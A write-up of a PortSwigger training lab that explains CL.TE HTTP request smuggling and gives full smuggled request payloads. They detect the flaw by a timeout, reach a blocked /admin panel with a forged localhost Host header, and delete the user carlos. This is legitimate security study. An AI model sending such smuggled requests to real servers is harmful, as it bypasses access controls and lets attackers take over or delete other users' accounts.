---
title: " PortSwiggerlabs: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"
date: 2026-07-01 09:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---

## Information : 

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.


## Solution : 

Quick note:

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.

Now back to the lab:

<img width="1691" height="817" alt="image" src="https://github.com/user-attachments/assets/a78f38a3-f29e-4060-a216-175a6e3653e7" />

First we send the request to Repeater :

<img width="1431" height="563" alt="image" src="https://github.com/user-attachments/assets/3b33547b-4f10-451e-ad82-bd6d174648ec" />

Now first we need to detect if the app is vulnerable to HTTP Request Smuggling : I always like to follow this graph from **Jarno Timmermans** : 

<img width="1859" height="934" alt="image" src="https://github.com/user-attachments/assets/9a90be80-cfa7-4f38-921c-dffcba4b90b2" />

But you can use this guide from HackerReciepe : 

```bash
https://www.thehacker.recipes/web/config/http-request-smuggling/#practice
```

Now first we send a specific request , that based on the response we will know if the backend and front end trust different Headers :

- First Downgrade the request to HTTP1.1/
- Then We change the request Method to POST 
- Then Remove Auto Length
- Add Transfer-Encoding: chunked
- Show Non-printable characters , this will be helpful when it comes to counting Bytes .
- In the Boy , add 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked
\r\n
1\r\n
123\r\n
X\r\n
# The \r\n are just line separators (We can easily show them using burp) . 
```

Now in case Front end uses CL , it will send the first 6 bytes and ignore the rest , if the backend uses TE , it will wait for the terminating character , but since Front end only sent 6 bytes , the backend won't know when the request will end and it will hang until we get a timeout . 

<img width="1865" height="674" alt="image" src="https://github.com/user-attachments/assets/314530fa-eb36-4bff-8623-e4a3622f687e" />

Perfect we get a timeout , huge indicator that we got a CL.TE .

Now we can use this to smuggle our request to access the /admin Endpoint bypassing the front end verification . 

The idea here is that we send 2 requests at Once , but the first one will have a terminating character so that the backend ends the first request and store the second one in the Buffer : 

The buffer now has the second request for /admin page , then once we submit a normal request it will be appended to what was inside the buffer from earlier . so first it will access the Admin Endpoint instead . 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked
\r\n
\r\n
0\r\n
\r\n
####### For the Backend The Request ends here , Now we smuggle the second one :
GET /admin HTTP/1.1
X-Ignore: x
```

Let's test this : 

- Downgrade to HTTP1.1 .
- Add the Transfer-Encoding Header.
- Add terminating character (For the backend server since we know it uses TE).
- Add the Smuggled Request to access the /admin Endpoint 

<img width="1527" height="792" alt="image" src="https://github.com/user-attachments/assets/35ad0d65-e822-4e97-b6a6-90df0157aac6" />

Pefect we get a 200 , this means the backend processed the first request and the second one is now in the buffer : 

Now if we make a normal request :

<img width="1522" height="709" alt="image" src="https://github.com/user-attachments/assets/e82be3c3-3af3-4418-8e0c-59ceeefc1dee" />

We got an Unauthorized response , this means the second request was processed but we couldn't Bypass the front end security control still . 

Another thing we can try is add a Host header to make it look like it's coming from the server itself . 

```bash
POST / HTTP/1.1
Host: 0acf0013043eebb1819c4805004b00b2.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Transfer-Encoding: chunked
Content-Length: 37
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost
```
<img width="1520" height="585" alt="image" src="https://github.com/user-attachments/assets/c91b89dc-0aae-454f-8ca2-6fb6dfbc2960" />

Now if we send the normal request after this one : 

<img width="1405" height="656" alt="image" src="https://github.com/user-attachments/assets/d7c03900-6891-4133-bdc5-43c544628b20" />

We got a new error saying that duplicate headers are not allowed . 

So probably the request that was sent looked something like this : 

```bash
POST / HTTP/1.1
Host: 0acf0013043eebb1819c4805004b00b2.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Transfer-Encoding: chunked
Content-Length: 37
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhostGET / HTTP/2
X-Ignore: xGET / HTTP/2
Host: 0acf0013043eebb1819c4805004b00b2.web-security-academy.net
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
....
```
As we can see , there are 2 Host headers this time , which causes the error . 

One way around this will be to move the normal request that will be appended to our smuggled request to our Request Body , by adding a parameter inside the Body and appending the entire request to it :

```bash
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost

x=
```

By adding the x= with no return lines , the entire normal request will go there which will remove the error we had earlier . 

But in this case we have to specify the content-length otherwise it will ignore our x since it will consider the content-length to be 0 . 

So the final request should look something like this :

```bash
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

We can specify the content-length to be anything as long as it's bigger than 2 . so that it would append the normal request to it . 

Now we send our Attack request : 

<img width="1568" height="760" alt="image" src="https://github.com/user-attachments/assets/503bbdd2-e536-4852-a440-4f958fd0f54e" />

Now expecting that the buffer has this part :

```bash
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

We just send a normal request and by default it will be appended to the x parameter . 

<img width="1574" height="832" alt="image" src="https://github.com/user-attachments/assets/7dc26c8d-9c36-436c-8ba3-eac26a3f0dd6" />

And it does :) We are able to access the /admin Pannel . 

Now to remove carlos , we can take a look at the URL for carlos deletion : 

<img width="1563" height="669" alt="image" src="https://github.com/user-attachments/assets/cd6cebe5-d59f-4e56-b4cd-0bb6446a61ca" />

Perfect it's via a GET request : 

```bash
/admin/delete?username=carlos
```

Now all we need to do is try to access this endpoint instead of the /admin . 

Same concept as before we just change the URL : 

```bash
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

Now if we send it : 

<img width="1493" height="686" alt="image" src="https://github.com/user-attachments/assets/d0d923db-105f-483a-9871-9e9e73c566ad" />

Assuming it is stored inside the Buffer , we should be able to access it now if we just make a normal request : 

<img width="1519" height="569" alt="image" src="https://github.com/user-attachments/assets/1193704a-a4a6-41ee-bb86-34b4a2da12ce" />

Perfect, the redirection means it was deleted , now if we access the admin endpoint again (Same way we did earlier) :

<img width="1767" height="797" alt="image" src="https://github.com/user-attachments/assets/7621ea46-064c-4c32-a2ab-795aefe72b7b" />

We see that the user carlos was deleted and that we have solved the lab . 

That was all for this lab, see you in the next one :)


